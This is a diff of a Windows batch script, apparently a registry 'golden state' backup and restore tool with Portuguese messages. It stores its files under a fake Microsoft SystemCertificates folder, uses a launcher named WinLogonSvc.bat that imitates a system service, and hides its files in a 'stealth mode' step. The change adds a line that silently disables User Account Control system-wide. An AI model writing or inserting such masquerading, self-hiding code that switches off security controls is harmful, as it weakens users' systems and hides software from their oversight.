@@ -20,7 +20,6 @@ set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
 set "launcherFile=WinLogonSvc.bat"
 set "workerFile=restore_worker.bat"
 set "regFile=%secretPath%\HKCU_GoldenState.reg"
-set "goldenHashFile=%APPDATA%\golden_hash.txt"
 
 :START
 cls
@@ -54,7 +53,8 @@ if not exist "%~dp0\%workerFile%" (
 )
 
 if not exist "%~dp0\%regFile%" (
-    reg export "HKCU" "%regFile%" /y 
+    reg export "HKCU" "%regFile%" /y >nul
+    echo   [OK]   Arquivo de Registro criado.
     set "error=0"
 ) else (
     echo   [OK]   Arquivo de Registro encontrado.
@@ -109,6 +109,7 @@ if %errorlevel% equ 0 (
 )
 echo.
 echo [ACAO]   Aplicando modo furtivo (ocultando arquivos) e protegendo arquivos...
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
 attrib +s +h "%secretPath%\*" >nul 2>&1
 attrib +s +h "%secretPath%" >nul 2>&1
 echo [SUCESSO] Modo furtivo ativado e arquivos protegidos contra exclusão.
